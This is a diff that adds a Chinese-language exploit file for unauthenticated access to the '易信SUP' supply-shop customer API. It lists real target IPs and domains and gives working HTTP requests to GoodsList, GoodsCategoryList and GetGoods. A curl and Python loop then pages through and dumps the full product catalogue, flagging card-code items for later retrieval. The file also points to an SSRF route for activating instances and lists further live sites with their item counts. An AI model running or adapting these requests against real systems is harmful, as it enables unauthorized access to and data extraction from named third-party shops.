@@ -1,0 +1,85 @@
+# 易信SUP 客户站 /api/customer/Home/* 全商品面未授权
+# 目标示例：154.12.94.23（Host: sup.yixinsup.top.）/ 154.12.94.216（Host: shop.lmbb77.top.）
+# 判据：200 + {"code":0,"data":{...,"count":N},"message":"ok"}
+# 前提：实例已激活（GetStatus.activated=true）；Host 带尾点；全程无 Cookie/Token
+
+### 0) 预检：实例必须已激活，否则业务接口回 403「系统未授权」
+POST /api/console/Activate/GetStatus HTTP/1.1
+Host: sup.yixinsup.top.
+Content-Type: application/json
+Content-Length: 2
+
+{}
+
+# => 200 {"code":0,"data":{"activated":true,"locked":false,"status":1,...}}
+#    activated=true 即可开打；未激活先走同产品的 Activate/GoSystem auth_server SSRF 激活
+
+### 1) 阴性基线：游客登录是关的，证明后续确实无凭据
+POST /api/customer/Login/GuestLogin HTTP/1.1
+Host: sup.yixinsup.top.
+Content-Type: application/json
+Content-Length: 2
+
+{}
+
+# => 200 {"code":1,"data":null,"message":"游客登录已关闭"}
+
+### 2) 全量商品列表 —— GET 版（goods_category_id=0 表全部，list_rows 控制每页）
+GET /api/customer/Home/GoodsList?goods_category_id=0&page=1&list_rows=100 HTTP/1.1
+Host: sup.yixinsup.top.
+Connection: close
+
+# => 200 {"code":0,"data":{"data":[
+#   {"id":127,"name":"音乐极速手工赞","price":0.02805,"is_card_code":false,"stock":-1,
+#    "buy_params":[...],"status":1}, ...
+# ],"count":108},"message":"ok"}
+
+# 字段：id=后续详情/下单主键；is_card_code=是否卡密类（直接决定要不要去取卡面）；
+#       stock=-1 多为不限量/上游代充；buy_params=下单必填参数；status=上下架
+
+### 3) 等价 POST 版（同一逻辑，body 为 JSON）
+POST /api/customer/Home/GoodsList HTTP/1.1
+Host: sup.yixinsup.top.
+Content-Type: application/json
+Content-Length: 26
+
+{"list_rows":200,"page":1}
+
+### 4) 完整分类树（35 个子类，body 用空 JSON）
+POST /api/customer/Home/GoodsCategoryList HTTP/1.1
+Host: sup.yixinsup.top.
+Content-Type: application/json
+Content-Length: 2
+
+{}
+
+### 5) 单品详情 —— 必须 GET + 查询串，POST 取不到
+GET /api/customer/Home/GetGoods?id=127 HTTP/1.1
+Host: sup.yixinsup.top.
+Connection: close
+
+# => 200 {"code":0,"data":{"id":127,"name":"音乐极速手工赞","price":0.02805,"buy_params":[...]}}
+
+### 6) 全量落地（curl.exe 直连，含 Host 尾点；按 count 算页数）
+T=http://154.12.94.23
+H='Host: sup.yixinsup.top.'
+curl.exe -sS --noproxy "*" -H "$H" \
+  "$T/api/customer/Home/GoodsList?goods_category_id=0&page=1&list_rows=1" > p1.json
+CNT=$(python -c "import json;print(json.load(open('p1.json'))['data']['count'])")
+PAGES=$(( (CNT + 199) / 200 ))
+for i in $(seq 1 $PAGES); do
+  curl.exe -sS --noproxy "*" -H "$H" \
+    "$T/api/customer/Home/GoodsList?goods_category_id=0&page=$i&list_rows=200" > "gl_$i.json"
+  sleep 1
+done
+python - <<'EOF'
+import json,glob
+rows=[r for f in sorted(glob.glob('gl_*.json')) for r in json.load(open(f))['data']['data']]
+json.dump(rows,open('goods_all.json','w'),ensure_ascii=False,indent=1)
+print("total",len(rows),"card",sum(1 for r in rows if r.get('is_card_code')))
+EOF
+# 然后对 is_card_code=true 的 id 逐个 GET /api/customer/Home/GetGoods?id=<id> 取 buy_params
+
+### 7) 换实例/换 vhost 的注意点
+# 同一 IP 常挂多站，Host 必须是该实例自己的绑定域名且带尾点；卡商站同套系统通用
+# 实测清单：sup.yixinsup.top. → count=108；shop.lmbb77.top. → count=14；niangao.site. → count=474
